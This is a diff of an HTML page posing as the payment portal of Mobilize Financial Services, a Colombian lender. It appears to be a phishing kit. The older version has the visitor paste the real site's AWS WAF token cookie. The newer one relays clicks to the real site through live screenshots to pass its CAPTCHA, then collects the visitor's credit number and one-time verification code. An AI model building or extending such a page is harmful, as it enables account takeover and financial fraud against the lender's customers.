@@ -4,901 +4,420 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mobilize Financial Services</title>
-
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Poppins', sans-serif;
-        }
+        *{box-sizing:border-box;margin:0;padding:0;font-family:'Poppins',sans-serif}
+        body{background:#f2f3f5;color:#333;min-height:100vh;display:flex;flex-direction:column}
+        .header{background:#fff;padding:25px 40px;box-shadow:0 2px 5px rgba(0,0,0,.05);display:flex;align-items:center}
+        .header img{height:100px;width:auto;object-fit:contain}
+        .main-container{flex:1;display:flex;justify-content:center;align-items:center;padding:40px 20px}
+        .card{background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.08);display:flex;width:100%;max-width:1050px;overflow:hidden}
+        .left-panel{background:#242833;color:#fff;padding:45px 40px;width:38%;display:flex;flex-direction:column}
+        .shield-icon{background:#d95d1e;width:40px;height:40px;border-radius:50%;display:flex;justify-content:center;align-items:center;margin-bottom:20px;color:#fff}
+        .left-panel h2{font-size:1.125rem;font-weight:600;margin-bottom:15px}
+        .left-panel p{font-size:13px;line-height:1.6;color:#b3b6c1;margin-bottom:20px}
+        .left-panel ol{padding-left:18px;font-size:13px;line-height:1.6;color:#b3b6c1;margin-bottom:25px}
+        .left-panel ol li{margin-bottom:12px}
+        .left-panel ol li strong{color:#fff;font-weight:600}
+        .contact-info{margin-top:auto;font-size:12px;color:#b3b6c1}
+        .contact-info ul{list-style:none;margin-top:10px}
+        .contact-info ul li{margin-bottom:5px}
+        .right-panel{padding:45px 50px;width:62%}
+        .right-panel h2{font-size:1.125rem;font-weight:600;color:#242833;margin-bottom:25px}
 
-        body {
-            background-color: #f2f3f5;
-            color: #333;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
+        .stepper{display:flex;align-items:center;justify-content:space-between;position:relative;margin-bottom:30px;padding:0 20px}
+        .stepper::before{content:'';position:absolute;top:15px;left:40px;right:40px;height:2px;background:#e0e0e0;z-index:1}
+        .step{position:relative;z-index:2;display:flex;flex-direction:column;align-items:center;background:#fff;padding:0 10px}
+        .step-circle{width:30px;height:30px;border-radius:50%;background:#fff;border:2px solid #e0e0e0;display:flex;justify-content:center;align-items:center;font-weight:600;color:#777;font-size:13px;margin-bottom:8px;transition:all .3s}
+        .step.active .step-circle{background:#e65c00;border-color:#e65c00;color:#fff}
+        .step.completed .step-circle{background:#34a853;border-color:#34a853;color:#fff}
+        .step span{font-size:11px;color:#666;font-weight:500}
+        .step.active span{color:#242833;font-weight:600}
+        .step.completed span{color:#34a853;font-weight:600}
 
-        .header {
-            background-color: #ffffff;
-            padding: 25px 40px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-            display: flex;
-            align-items: center;
-        }
+        .helper-text{font-size:12px;color:#666;margin-bottom:15px}
+        .input-group{margin-bottom:25px}
+        .input-group label{display:block;font-size:13px;font-weight:600;color:#242833;margin-bottom:8px}
+        .input-group label span{color:#e65c00}
+        .input-wrapper input{width:100%;padding:12px 15px;border:1px solid #ccc;border-radius:8px;font-size:14px;outline:none;transition:border .3s;font-family:'Poppins',sans-serif}
+        .input-wrapper input:focus{border-color:#e65c00}
+        .input-hint{font-size:11px;color:#888;margin-top:5px;display:block}
 
-        .header img {
-            height: 100px;
-            width: auto;
-            object-fit: contain;
-        }
+        .form-step{display:none;animation:fadeIn .4s ease}
+        .form-step.visible{display:block}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
 
-        .main-container {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 40px 20px;
-        }
+        .live-viewer{position:relative;border:1px solid #eee;border-radius:12px;overflow:hidden;margin-bottom:20px;background:#fafafa;cursor:crosshair}
+        .live-viewer img{width:100%;display:block}
+        .live-viewer .loading-overlay{position:absolute;inset:0;background:rgba(255,255,255,.85);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:5}
+        .live-viewer .loading-overlay p{font-size:13px;color:#666;margin-top:10px}
 
-        .card {
-            background-color: #ffffff;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-            display: flex;
-            width: 100%;
-            max-width: 1050px;
-            overflow: hidden;
-        }
+        .otp-row{display:flex;gap:12px;align-items:flex-end;margin-bottom:20px}
+        .otp-row .input-group{flex:1;margin-bottom:0}
 
-        .left-panel {
-            background-color: #242833;
-            color: #ffffff;
-            padding: 45px 40px;
-            width: 38%;
-            display: flex;
-            flex-direction: column;
-        }
+        .btn-continue{width:100%;padding:15px;background:#e0e0e0;color:#a0a0a0;border:none;border-radius:25px;font-size:15px;font-weight:600;cursor:not-allowed;transition:all .3s;font-family:'Poppins',sans-serif}
+        .btn-continue.active{background:#242833;color:#fff;cursor:pointer}
+        .btn-continue.active:hover{background:#1a1d26}
+        .btn-orange{width:100%;padding:15px;background:#e65c00;color:#fff;border:none;border-radius:25px;font-size:15px;font-weight:600;cursor:pointer;font-family:'Poppins',sans-serif;transition:all .3s}
+        .btn-orange:hover{background:#cc5200}
+        .btn-orange:disabled{background:#f0b088;cursor:not-allowed}
+        .btn-verify{padding:12px 30px;background:#242833;color:#fff;border:none;border-radius:25px;font-size:14px;font-weight:600;cursor:pointer;font-family:'Poppins',sans-serif;white-space:nowrap}
+        .btn-verify:hover{background:#1a1d26}
+        .btn-verify:disabled{background:#999;cursor:not-allowed}
 
-        .shield-icon {
-            background-color: #d95d1e;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 20px;
-            color: white;
-            font-size: 20px;
-        }
+        .spinner{display:inline-block;width:18px;height:18px;border:3px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
+        @keyframes spin{to{transform:rotate(360deg)}}
 
-        .left-panel h2 {
-            font-size: 1.125rem;
-            font-weight: 600;
-            margin-bottom: 15px;
-        }
+        .result-box{margin-top:15px;padding:16px 20px;border-radius:10px;font-size:13px;animation:fadeIn .4s}
+        .result-box.success{background:#e8f5e9;border:1px solid #a5d6a7;color:#2e7d32}
+        .result-box.error{background:#fce4ec;border:1px solid #ef9a9a;color:#c62828}
+        .result-box.info{background:#e3f2fd;border:1px solid #90caf9;color:#1565c0}
+        .result-box pre{white-space:pre-wrap;word-break:break-word;font-size:12px;max-height:300px;overflow-y:auto;margin-top:8px;font-family:'Courier New',monospace}
 
-        .left-panel p {
-            font-size: 13px;
-            line-height: 1.6;
-            color: #b3b6c1;
-            margin-bottom: 20px;
-        }
+        .footer{background:#fff;padding:40px;font-size:11px;color:#666;line-height:1.6;margin-top:auto}
+        .footer p{margin-bottom:12px}
+        .footer img{height:90px;width:auto;object-fit:contain;margin-top:20px;margin-bottom:15px}
+        .footer-legal{font-size:9px;color:#999}
 
-        .left-panel ol {
-            padding-left: 18px;
-            font-size: 13px;
-            line-height: 1.6;
-            color: #b3b6c1;
-            margin-bottom: 25px;
-        }
-
-        .left-panel ol li {
-            margin-bottom: 12px;
-        }
-
-        .left-panel ol li strong {
-            color: #ffffff;
-            font-weight: 600;
-        }
-
-        .contact-info {
-            margin-top: auto;
-            font-size: 12px;
-            color: #b3b6c1;
-        }
-
-        .contact-info ul {
-            list-style: none;
-            margin-top: 10px;
-        }
-        .contact-info ul li {
-            margin-bottom: 5px;
-        }
-
-        .right-panel {
-            padding: 45px 50px;
-            width: 62%;
-        }
-
-        .right-panel h2 {
-            font-size: 1.125rem;
-            font-weight: 600;
-            color: #242833;
-            margin-bottom: 25px;
-        }
-
-        .stepper {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            position: relative;
-            margin-bottom: 30px;
-            padding: 0 20px;
-        }
-
-        .stepper::before {
-            content: '';
-            position: absolute;
-            top: 15px;
-            left: 40px;
-            right: 40px;
-            height: 2px;
-            background-color: #e0e0e0;
-            z-index: 1;
-        }
-
-        .step {
-            position: relative;
-            z-index: 2;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            background: #fff;
-            padding: 0 10px;
-        }
-
-        .step-circle {
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            background-color: #fff;
-            border: 2px solid #e0e0e0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-weight: 600;
-            color: #777;
-            font-size: 13px;
-            margin-bottom: 8px;
-            transition: all 0.3s;
-        }
-
-        .step.active .step-circle {
-            background-color: #e65c00;
-            border-color: #e65c00;
-            color: #fff;
-        }
-
-        .step.completed .step-circle {
-            background-color: #34a853;
-            border-color: #34a853;
-            color: #fff;
-        }
-
-        .step span {
-            font-size: 11px;
-            color: #666;
-            font-weight: 500;
-        }
-        .step.active span { color: #242833; font-weight: 600; }
-        .step.completed span { color: #34a853; font-weight: 600; }
-
-        .helper-text {
-            font-size: 12px;
-            color: #666;
-            margin-bottom: 15px;
-        }
-
-        .input-group {
-            margin-bottom: 25px;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #242833;
-            margin-bottom: 8px;
-        }
-
-        .input-group label span {
-            color: #e65c00;
-        }
-
-        .input-wrapper input {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            font-size: 14px;
-            outline: none;
-            transition: border 0.3s;
-            font-family: 'Poppins', sans-serif;
-        }
-
-        .input-wrapper input:focus {
-            border-color: #e65c00;
-        }
-
-        .input-hint {
-            font-size: 11px;
-            color: #888;
-            margin-top: 5px;
-            display: block;
-        }
-
-        /* --- IFRAME LIVE --- */
-        .live-section {
-            border-top: 1px solid #eee;
-            padding-top: 25px;
-            text-align: center;
-        }
-
-        .live-section h3 {
-            font-size: 15px;
-            font-weight: 600;
-            color: #242833;
-            margin-bottom: 5px;
-        }
-
-        .live-section > p {
-            font-size: 12px;
-            color: #666;
-            margin-bottom: 15px;
-        }
-
-        .iframe-box {
-            width: 100%;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            overflow: hidden;
-            margin-bottom: 15px;
-            position: relative;
-            background: #fafafa;
-        }
-
-        .iframe-box iframe {
-            width: 100%;
-            height: 520px;
-            border: none;
-            display: block;
-        }
-
-        .iframe-loading {
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(255,255,255,0.9);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            gap: 10px;
-            z-index: 5;
-        }
-
-        .iframe-loading.hidden { display: none; }
-
-        .spinner-lg {
-            width: 40px; height: 40px;
-            border: 4px solid #e0e0e0;
-            border-top-color: #e65c00;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        /* Fallback */
-        .fallback-box {
-            background: #fff8f0;
-            border: 1px solid #f0c090;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 20px;
-            text-align: center;
-            display: none;
-        }
-
-        .fallback-box.visible { display: block; }
-
-        .fallback-box h4 { color: #e65c00; font-size: 14px; margin-bottom: 8px; }
-        .fallback-box p { font-size: 12px; color: #666; margin-bottom: 10px; }
-        .fallback-box a { color: #e65c00; font-weight: 600; text-decoration: none; }
-        .fallback-box a:hover { text-decoration: underline; }
-
-        .token-input-box {
-            text-align: left;
-            margin-top: 12px;
-            padding-top: 12px;
-            border-top: 1px solid #eee;
-        }
-
-        .token-input-box label {
-            font-size: 12px;
-            font-weight: 600;
-            color: #242833;
-            display: block;
-            margin-bottom: 6px;
-        }
-
-        /* --- FORM STEPS --- */
-        .form-step { display: none; animation: fadeIn 0.4s ease; }
-        .form-step.visible { display: block; }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* OTP */
-        .otp-methods {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .otp-method {
-            flex: 1;
-            padding: 14px 10px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .otp-method:hover { border-color: #e65c00; }
-        .otp-method.selected { border-color: #e65c00; background: #fff5f0; }
-        .otp-method .icon { font-size: 22px; margin-bottom: 4px; }
-        .otp-method .label { font-size: 13px; font-weight: 600; color: #242833; }
-        .otp-method .desc { font-size: 11px; color: #888; }
-
-        .otp-input-row {
-            display: flex;
-            gap: 12px;
-            align-items: flex-end;
-        }
-        .otp-input-row .input-group { flex: 1; margin-bottom: 0; }
-
-        /* Results */
-        .result-box {
-            margin-top: 20px;
-            padding: 16px 20px;
-            border-radius: 10px;
-            font-size: 13px;
-            animation: fadeIn 0.4s ease;
-        }
-
-        .result-box.success { background: #e8f5e9; border: 1px solid #a5d6a7; color: #2e7d32; }
-        .result-box.error { background: #fce4ec; border: 1px solid #ef9a9a; color: #c62828; }
-        .result-box.info { background: #e3f2fd; border: 1px solid #90caf9; color: #1565c0; }
-
-        .result-box pre {
-            white-space: pre-wrap;
-            word-break: break-word;
-            font-size: 12px;
-            max-height: 300px;
-            overflow-y: auto;
-            margin-top: 8px;
-            font-family: 'Courier New', monospace;
-        }
-
-        .credit-info-card {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        .credit-info-card h4 { font-size: 14px; color: #242833; margin-bottom: 12px; }
-        .credit-info-card pre {
-            white-space: pre-wrap; word-break: break-word;
-            font-size: 12px; font-family: 'Courier New', monospace;
-        }
-
-        /* Buttons */
-        .btn-continue {
-            width: 100%;
-            padding: 15px;
-            background-color: #e0e0e0;
-            color: #a0a0a0;
-            border: none;
-            border-radius: 25px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: not-allowed;
-            transition: all 0.3s;
-            font-family: 'Poppins', sans-serif;
-        }
-
-        .btn-continue.active {
-            background-color: #242833;
-            color: #ffffff;
-            cursor: pointer;
-        }
-        .btn-continue.active:hover { background-color: #1a1d26; }
-
-        .btn-orange {
-            width: 100%;
-            padding: 15px;
-            background-color: #e65c00;
-            color: #ffffff;
-            border: none;
-            border-radius: 25px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            font-family: 'Poppins', sans-serif;
-        }
-        .btn-orange:hover { background-color: #cc5200; }
-        .btn-orange:disabled { background-color: #f0b088; cursor: not-allowed; }
-
-        .btn-verify {
-            padding: 12px 30px;
-            background-color: #242833;
-            color: #ffffff;
-            border: none;
-            border-radius: 25px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            font-family: 'Poppins', sans-serif;
-            white-space: nowrap;
-        }
-        .btn-verify:hover { background-color: #1a1d26; }
-        .btn-verify:disabled { background-color: #999; cursor: not-allowed; }
-
-        .spinner {
-            display: inline-block;
-            width: 18px; height: 18px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top-color: #fff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            vertical-align: middle;
-            margin-right: 8px;
-        }
-
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        .footer {
-            background-color: #ffffff;
-            padding: 40px;
-            font-size: 11px;
-            color: #666;
-            line-height: 1.6;
-            margin-top: auto;
-        }
-        .footer p { margin-bottom: 12px; }
-        .footer img { height: 90px; width: auto; object-fit: contain; margin-top: 20px; margin-bottom: 15px; }
-        .footer-legal { font-size: 9px; color: #999; }
-
-        @media (max-width: 900px) {
-            .header { padding: 20px; justify-content: center; }
-            .header img { height: 70px; }
-            .main-container { padding: 0; align-items: flex-start; }
-            .card { flex-direction: column; border-radius: 20px 20px 0 0; }
-            .left-panel { width: 100%; padding: 30px 20px; order: 2; background-color: #1f232c; padding-top: 40px; }
-            .right-panel { width: 100%; padding: 30px 20px; order: 1; }
-            .stepper { padding: 0 10px; }
-            .stepper::before { left: 20px; right: 20px; }
-            .footer { padding: 20px; text-align: center; }
-            .iframe-box iframe { height: 400px; }
-            .otp-methods { flex-direction: column; }
-            .otp-input-row { flex-direction: column; }
-            .otp-input-row .btn-verify { width: 100%; }
-            .footer img { height: 70px; }
+        @media(max-width:900px){
+            .header{padding:15px 20px;justify-content:center}
+            .header img{height:60px}
+            .main-container{padding:0;align-items:flex-start}
+            .card{flex-direction:column;border-radius:0}
+            .left-panel{width:100%;padding:25px 20px;order:1}
+            .right-panel{width:100%;padding:25px 20px;order:2}
+            .stepper{padding:0 5px}
+            .stepper::before{left:15px;right:15px}
+            .footer{padding:20px;text-align:center}
+            .footer img{height:60px}
+            .otp-row{flex-direction:column}
+            .otp-row .btn-verify{width:100%}
+            .left-panel h2{font-size:1rem;margin-bottom:10px}
+            .left-panel p{font-size:12px;margin-bottom:12px}
+            .left-panel ol{font-size:12px;margin-bottom:15px}
+            .left-panel ol li{margin-bottom:8px}
+            .contact-info{font-size:11px}
+            .right-panel h2{font-size:1rem;margin-bottom:15px}
         }
     </style>
 </head>
 <body>
 
-    <header class="header">
-        <img src="mobil.png" alt="Mobilize Financial Services Logo">
-    </header>
+<header class="header">
+    <img src="mobil.png" alt="Mobilize Financial Services Logo">
+</header>
 
-    <main class="main-container">
-        <div class="card">
-
-            <!-- PANEL IZQUIERDO -->
-            <div class="left-panel">
-                <div class="shield-icon">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><path d="M9 12l2 2 4-4"></path></svg>
-                </div>
-                <h2>Verificación segura</h2>
-                <p>Tu experiencia de pagos en línea es más segura.</p>
-                <p>Hemos implementado unas verificaciones rápidas para proteger la información:</p>
-
-                <ol>
-                    <li>Ingresa el <strong>número de crédito</strong>.</li>
-                    <li>Haz la validación a través de <strong>imágenes</strong>.</li>
-                    <li>Ingresa el <strong>código</strong> de un solo uso que recibirás en tu número celular o en tu correo electrónico registrado</li>
-                    <li>Revisa tu crédito y <strong>realiza el pago</strong> de forma segura.</li>
-                </ol>
-
-                <p>Tus medios de pago, valores y fechas siguen siendo los mismos.</p>
-
-                <div class="contact-info">
-                    <p>¿No recuerdas tu número de crédito o no recibes el código? Comunícate con nuestras líneas de atención:</p>
-                    <ul>
-                        <li>• Celular: 350 318 9889</li>
-                        <li>• Bogotá: (601) 491 8516</li>
-                        <li>• Medellín: (604) 480 3474</li>
-                    </ul>
-                </div>
+<main class="main-container">
+    <div class="card">
+        <div class="left-panel">
+            <div class="shield-icon">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
             </div>
-
-            <!-- PANEL DERECHO -->
-            <div class="right-panel">
-                <h2>Verificación por código</h2>
-
-                <!-- STEPPER -->
-                <div class="stepper">
-                    <div class="step active" id="stepItem1">
-                        <div class="step-circle">1</div>
-                        <span>Búsqueda</span>
-                    </div>
-                    <div class="step" id="stepItem2">
-                        <div class="step-circle">2</div>
-                        <span>Envío</span>
-                    </div>
-                    <div class="step" id="stepItem3">
-                        <div class="step-circle">3</div>
-                        <span>Verificación</span>
-                    </div>
-                </div>
-
-                <!-- ===== PASO 1: Crédito + Portal en vivo ===== -->
-                <div id="formStep1" class="form-step visible">
-                    <p class="helper-text">Paso 1 de 3 — Ingresa tu número de crédito y resuelve la verificación en el portal de Mobilize.</p>
-
-                    <div class="input-group">
-                        <div class="input-wrapper">
-                            <label>Número de crédito <span>*</span></label>
-                            <input type="text" id="creditNumber" placeholder="" oninput="updateContinueBtn()">
-                            <span class="input-hint">Solo números, sin espacios.</span>
-                        </div>
-                    </div>
-
-                    <div class="live-section">
-                        <h3>Verificación de seguridad</h3>
-                        <p>Resuelve el CAPTCHA directamente en el portal oficial de Mobilize. Tu sesión se sincroniza en tiempo real.</p>
-
-                        <!-- IFRAME: carga el portal real -->
-                        <div class="iframe-box" id="iframeBox">
-                            <iframe
-                                id="liveIframe"
-                                src="https://www.mobilize-fs.com.co/portal-pagos/"
-                                sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
-                                loading="lazy"
-                            ></iframe>
-                            <div class="iframe-loading" id="iframeLoading">
-                                <div class="spinner-lg"></div>
-                                <p style="font-size:13px; color:#666;">Cargando portal de Mobilize...</p>
-                            </div>
-                        </div>
-
-                        <!-- Token WAF (siempre visible debajo del iframe) -->
-                        <div class="token-input-box">
-                            <label>Token WAF (después de resolver el CAPTCHA)</label>
-                            <div class="input-wrapper">
-                                <input type="text" id="wafTokenInput" placeholder="Pega aquí el x-aws-waf-token" oninput="updateContinueBtn()">
-                            </div>
-                            <span class="input-hint">DevTools → Application → Cookies → busca <code>aws-waf-token</code> en el dominio de Mobilize.</span>
-                        </div>
-
-                        <!-- Fallback si iframe no carga -->
-                        <div class="fallback-box" id="fallbackBox">
-                            <h4>⚠️ El portal no se cargó en el iframe</h4>
-                            <p>El sitio puede bloquear la carga. Resuélvelo en una pestaña aparte:</p>
-                            <a href="https://www.mobilize-fs.com.co/portal-pagos/" target="_blank" rel="noopener">Abrir portal de Mobilize →</a>
-                            <p style="margin-top:10px;">Después de resolver el CAPTCHA, copia el token WAF y pégalo arriba.</p>
-                        </div>
-                    </div>
-
-                    <button class="btn-continue" id="btnContinue" disabled onclick="consultarCredito()">CONTINUAR</button>
-                </div>
-
-                <!-- ===== PASO 2: Info crédito + envío OTP ===== -->
-                <div id="formStep2" class="form-step">
-                    <p class="helper-text">Paso 2 de 3 — Revisa la información de tu crédito y solicita el código OTP.</p>
-
-                    <div id="creditInfoCard" class="credit-info-card"></div>
-
-                    <p style="font-size:13px; color:#666; margin-bottom:15px;">Elige cómo recibir tu código de verificación:</p>
-
-                    <div class="otp-methods">
-                        <div class="otp-method selected" onclick="selectOtpMethod(this, 'sms')">
-                            <div class="icon">📱</div>
-                            <div class="label">SMS</div>
-                            <div class="desc">Celular registrado</div>
-                        </div>
-                        <div class="otp-method" onclick="selectOtpMethod(this, 'email')">
-                            <div class="icon">📧</div>
-                            <div class="label">Email</div>
-                            <div class="desc">Correo registrado</div>
-                        </div>
-                    </div>
-
-                    <button class="btn-orange" id="btnOtp" onclick="solicitarOtp()">ENVIAR CÓDIGO OTP</button>
-                </div>
-
-                <!-- ===== PASO 3: Verificar OTP ===== -->
-                <div id="formStep3" class="form-step">
-                    <p class="helper-text">Paso 3 de 3 — Ingresa el código de verificación que recibiste.</p>
-
-                    <div class="input-group">
-                        <label>Código OTP <span>*</span></label>
-                        <div class="otp-input-row">
-                            <div class="input-group">
-                                <div class="input-wrapper">
-                                    <input type="text" id="otpCode" placeholder="Código de 6 dígitos" maxlength="6">
-                                </div>
-                            </div>
-                            <button class="btn-verify" id="btnVerifyOtp" onclick="verificarOtp()">VERIFICAR</button>
-                        </div>
-                        <span class="input-hint" style="margin-top:8px;">El código fue enviado a tu <strong id="otpDestLabel">celular</strong>.</span>
-                    </div>
-                </div>
-
-                <!-- ===== RESULTADO FINAL ===== -->
-                <div id="formStepResult" class="form-step">
-                    <div class="result-box success">
-                        <strong>✓ Verificación exitosa</strong>
-                        <p style="margin-top:6px; font-size:12px;">Tu identidad fue verificada correctamente.</p>
-                    </div>
-                    <div id="facturasMobilize" style="margin-top:20px;"></div>
-                    <button class="btn-orange" style="margin-top:20px;" onclick="resetAll()">NUEVA CONSULTA</button>
-                </div>
-
-                <div id="resultMsg"></div>
+            <h2>Verificación segura</h2>
+            <p>Tu experiencia de pagos en línea es más segura.</p>
+            <p>Hemos implementado unas verificaciones rápidas para proteger la información:</p>
+            <ol>
+                <li>Ingresa el <strong>número de crédito</strong>.</li>
+                <li>Haz la validación a través de <strong>imágenes</strong>.</li>
+                <li>Ingresa el <strong>código</strong> de un solo uso que recibirás en tu número celular o en tu correo electrónico registrado</li>
+                <li>Revisa tu crédito y <strong>realiza el pago</strong> de forma segura.</li>
+            </ol>
+            <p>Tus medios de pago, valores y fechas siguen siendo los mismos.</p>
+            <div class="contact-info">
+                <p>¿No recuerdas tu número de crédito o no recibes el código? Comunícate con nuestras líneas de atención:</p>
+                <ul>
+                    <li>• Celular: 350 318 9889</li>
+                    <li>• Bogotá: (601) 491 8516</li>
+                    <li>• Medellín: (604) 480 3474</li>
+                </ul>
             </div>
         </div>
-    </main>
 
-    <footer class="footer">
-        <p>Todos los pagos serán aplicados según el horario bancario definido por la Entidad. De realizarse el pago fuera de este horario, éste será aplicado al siguiente día hábil bancario de conformidad con el Artículo 97 del Decreto 663 de 1993 (Estatuto Orgánico del Sistema Financiero).</p>
-        <p>Todo abono extraordinario realizado no adelantará cuotas del crédito; por defecto, éste será aplicado a capital bajo la modalidad de reducir el plazo. En caso de que desees que dicho abono sea abonado a capital bajo la modalidad de reducir cuota, una vez realices el pago deberás informar a la Entidad escribiendo al correo electrónico clientes@mobilize-fs.com o comunicándote con nuestras líneas de atención.</p>
-        <p>Si posees más de un crédito, es necesario realizar una transacción por cada uno.</p>
-        <p>Para resolver tus inquietudes sobre el crédito, contáctanos a través de nuestras líneas de atención.</p>
+        <div class="right-panel">
+            <h2>Verificación por código</h2>
 
-        <img src="footer.png" alt="Mobilize Footer Logo">
-        <p class="footer-legal">Los productos y servicios ofrecidos a través de MOBILIZE FINANCIAL SERVICES, son otorgados por RCI Colombia S.A Compañía de Financiamiento, entidad vigilada por la Superintendencia Financiera de Colombia</p>
-    </footer>
+            <div class="stepper">
+                <div class="step active" id="stepItem1"><div class="step-circle">1</div><span>Búsqueda</span></div>
+                <div class="step" id="stepItem2"><div class="step-circle">2</div><span>Envío</span></div>
+                <div class="step" id="stepItem3"><div class="step-circle">3</div><span>Verificación</span></div>
+            </div>
 
-    <script>
-        const API_BASE = window.location.origin;
-        let wafToken = null;
-        let stepUpToken = null;
-        let selectedOtpMethod = 'sms';
+            <!-- PASO 1: Crédito -->
+            <div id="formStep1" class="form-step visible">
+                <p class="helper-text">Paso 1 de 3 — Ingresa tu número de crédito.</p>
+                <div class="input-group">
+                    <label>Número de crédito <span>*</span></label>
+                    <div class="input-wrapper">
+                        <input type="text" id="creditNumber" placeholder="">
+                        <span class="input-hint">Solo números, sin espacios.</span>
+                    </div>
+                </div>
+                <button class="btn-continue" id="btnStart" disabled onclick="iniciarSesion()">CONTINUAR</button>
+            </div>
 
-        // ========== IFRAME: detectar si cargó o no ==========
-        const liveIframe = document.getElementById('liveIframe');
-        const iframeLoading = document.getElementById('iframeLoading');
+            <!-- PASO 2: CAPTCHA interactivo via screenshot -->
+            <div id="formStep2" class="form-step">
+                <p class="helper-text">Paso 2 de 3 — Resuelve la verificación de seguridad haciendo clic en las imágenes.</p>
+                <div class="live-viewer" id="liveViewer" onclick="handleViewerClick(event)">
+                    <img id="liveScreenshot" src="" alt="Sitio en vivo">
+                    <div class="loading-overlay" id="viewerLoading" style="display:none">
+                        <div class="spinner" style="width:30px;height:30px;border-width:4px;border-color:rgba(230,92,0,.2);border-top-color:#e65c00"></div>
+                        <p>Procesando...</p>
+                    </div>
+                </div>
+                <button class="btn-orange" id="btnSubmitCaptcha" onclick="clickBotonSitio('continuar')">ENVIAR VERIFICACIÓN</button>
+                <button class="btn-orange" style="margin-top:10px;background:#242833" onclick="refreshScreenshot()">ACTUALIZAR VISTA</button>
+            </div>
 
-        liveIframe.addEventListener('load', () => {
-            iframeLoading.classList.add('hidden');
-            // Verificar si realmente cargó contenido cross-origin
-            setTimeout(() => {
-                try {
-                    // Si esto NO lanza error, cargó algo local/vacío → fallback
-                    const doc = liveIframe.contentDocument;
-                    if (!doc || !doc.body || doc.body.innerHTML.length < 100) {
-                        showFallback();
-                    }
-                } catch (e) {
-                    // Cross-origin error = el sitio real SÍ cargó en el iframe ✓
-                    // El usuario puede interactuar con el CAPTCHA real
-                }
-            }, 2000);
+            <!-- PASO 3: OTP -->
+            <div id="formStep3" class="form-step">
+                <p class="helper-text">Paso 3 de 3 — Ingresa el código que recibiste en tu celular o correo.</p>
+                <div class="input-group">
+                    <label>Código de verificación <span>*</span></label>
+                    <div class="otp-row">
+                        <div class="input-group">
+                            <div class="input-wrapper">
+                                <input type="text" id="otpCode" placeholder="Código de 6 dígitos" maxlength="6">
+                            </div>
+                        </div>
+                        <button class="btn-verify" id="btnVerify" onclick="enviarOtp()">VERIFICAR</button>
+                    </div>
+                    <span class="input-hint">El código fue enviado a tu celular o correo registrado.</span>
+                </div>
+            </div>
+
+            <!-- RESULTADO -->
+            <div id="formStepResult" class="form-step">
+                <div class="result-box success">
+                    <strong>✓ Verificación exitosa</strong>
+                    <p style="margin-top:6px;font-size:12px">Tu identidad fue verificada correctamente.</p>
+                </div>
+                <div id="resultData" style="margin-top:15px"></div>
+                <button class="btn-orange" style="margin-top:20px" onclick="resetAll()">NUEVA CONSULTA</button>
+            </div>
+
+            <div id="resultMsg"></div>
+        </div>
+    </div>
+</main>
+
+<footer class="footer">
+    <p>Todos los pagos serán aplicados según el horario bancario definido por la Entidad.</p>
+    <p>Todo abono extraordinario realizado no adelantará cuotas del crédito; por defecto, éste será aplicado a capital bajo la modalidad de reducir el plazo.</p>
+    <p>Si posees más de un crédito, es necesario realizar una transacción por cada uno.</p>
+    <p>Para resolver tus inquietudes sobre el crédito, contáctanos a través de nuestras líneas de atención.</p>
+    <img src="footer.png" alt="Mobilize Footer Logo">
